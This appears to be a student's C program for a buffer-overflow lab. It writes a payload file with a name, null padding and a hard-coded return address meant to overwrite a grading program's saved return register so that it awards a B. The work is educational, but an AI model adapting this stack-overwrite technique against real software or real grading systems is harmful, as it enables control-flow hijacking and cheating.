/*
 * createdataB.c 
 * Produces a file called dataB with the student name, a nullbyte,
 * padding to overrun the stack, and the address of the instruction
 * in main to get a B, the latter of which will overwrite getName's
 * stored x30
 */
#include <stdio.h>
#include <stdlib.h>

/*
 * This main function takes no command-line arguments and does not 
 * read from stdin. It writes a sequence of bytes (student name, 
 * null-padding, and a return address) to the "dataB" file.
 * On success, the main writes nothing to stdout. 
 * On failure, the main prints an error message to stderr and returns
 * 1.
 */
int main(void) {
    int i;

    /* student name for grader output */
    char name[] = "Shin Qian";

    /* address to overwrite return pointer */
    const unsigned int returnAddress = 0x400890;

    /* open file and write name */
    FILE *psFile = fopen("dataB", "wb");
    if (psFile == NULL) {
        perror("Error opening file"); 
        return 1; 
    }
    fwrite(name, sizeof(char), sizeof(name) - 1, psFile);

    /* write null bytes to fill buffer and reach return address. 
    Number of bytes is 48 - student name length = 39. */
    for (i = 0; i < 39; i++) {
        fputc(0x00, psFile); 
    }

    /* overwrite return address */
    fwrite(&returnAddress, sizeof(unsigned int), 1, psFile);

    /* close file and return 0 */
    fclose(psFile);
    return 0;
}
